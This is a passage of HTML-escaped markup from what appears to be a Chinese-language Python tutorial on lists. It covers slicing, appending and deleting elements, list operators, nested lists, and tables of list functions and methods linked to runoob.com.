list3&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 修改第三个到第四元素&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 2, 22, 33, 5]&lt;/span&gt;
list4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 3, 4, 5]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 第一个-1表示从最后一个开始&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 中间为空表示移动到列表末,最后一个-1为步长,-表示逆向&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [4, 3, 2]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [5]&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[&#39;test&#39;, 1, 1.2, 999]
test
[1, 1.2]
[1.2, 999]
[1, &#39;test&#39;, 1, &#39;test&#39;]
[&#39;test&#39;, 1, 1.2, 999, 1, &#39;test&#39;]
[1, 2, 3, 4, 5]
[&#39;test&#39;, 2, 3, 4, 5]
[&#39;test&#39;, 2, 22, 33, 5]
[1, 2, 3, 4, 5]
[5, 4, 3, 2, 1]
[4, 3, 2]
[5]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;更新和删除元素&#34;&gt;&lt;a href=&#34;#更新和删除元素&#34; class=&#34;headerlink&#34; title=&#34;更新和删除元素&#34;&gt;&lt;/a&gt;更新和删除元素&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;list5 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list5&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
list5&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;restart&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list5&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 在末尾添加元素&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; list5&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 删除第三个元素&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list5&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[1, 3, 5, &#39;test&#39;]
[1, 3, 5, &#39;test&#39;, &#39;restart&#39;]
[1, 3, &#39;test&#39;, &#39;restart&#39;]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;列表脚本操作符&#34;&gt;&lt;a href=&#34;#列表脚本操作符&#34; class=&#34;headerlink&#34; title=&#34;列表脚本操作符&#34;&gt;&lt;/a&gt;列表脚本操作符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;list6 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list6&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list6&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 列表长度&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 组合&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 重复&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 存在与否&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 迭代&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[1, 2, 3, &#39;test&#39;]
4
[1, 2, 3, 4, 5, 6]
[&#39;test&#39;, &#39;test&#39;, &#39;test&#39;, &#39;test&#39;]
True
1 2 3 
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;镶嵌列表&#34;&gt;&lt;a href=&#34;#镶嵌列表&#34; class=&#34;headerlink&#34; title=&#34;镶嵌列表&#34;&gt;&lt;/a&gt;镶嵌列表&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 镶嵌列表&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;], [1, 2, 3]]
[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]
b
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;函数-1&#34;&gt;&lt;a href=&#34;#函数-1&#34; class=&#34;headerlink&#34; title=&#34;函数&#34;&gt;&lt;/a&gt;函数&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;函数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-len.html&#34;&gt;len(list)&lt;/a&gt; 列表元素个数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-max.html&#34;&gt;max(list)&lt;/a&gt; 返回列表元素最大值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-min.html&#34;&gt;min(list)&lt;/a&gt; 返回列表元素最小值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-list.html&#34;&gt;list(seq)&lt;/a&gt; 将元组转换为列表&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;方法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-append.html&#34;&gt;list.append(obj)&lt;/a&gt; 在列表末尾添加新的对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-count.html&#34;&gt;list.count(obj)&lt;/a&gt; 统计某个元素在列表中出现的次数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-extend.html&#34;&gt;list.extend(seq)&lt;/a&gt; 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-index.html&#34;&gt;list.index(obj)&lt;/a&gt; 从列表中找出某个值第一个匹配项的索引位置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-insert.html&#34;&gt;list.insert(index, obj)&lt;/a&gt; 将对象插入列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[list.pop(&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-pop.html&#34;&gt;index=-1])&lt;/a&gt; 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-remove.html&#34;&gt;list.remove(obj)&lt;/a&gt; 移除列表中某个值的第一个匹配项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-reverse.html&#34;&gt;list.reverse()&lt;/a&gt; 反向列表中元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-sort.html&#34;&gt;list.sort( key=None, reverse=False)&lt;/a&gt; 对原列表进行排序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-clear.html&#34;&gt;list.clear()&lt;/a&gt; 清空列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-att-list-copy.html&#34;&gt;list.copy()&lt;/a&gt; 复制列表&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;函数示例-2&#34;&gt;&lt;a href=&#34;#函数示例-2&#34; class=&#34;headerlink&#34; title=&#34;函数示例&#34;&gt;&lt;/a&gt;函数示例&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3&lt;/span&gt;
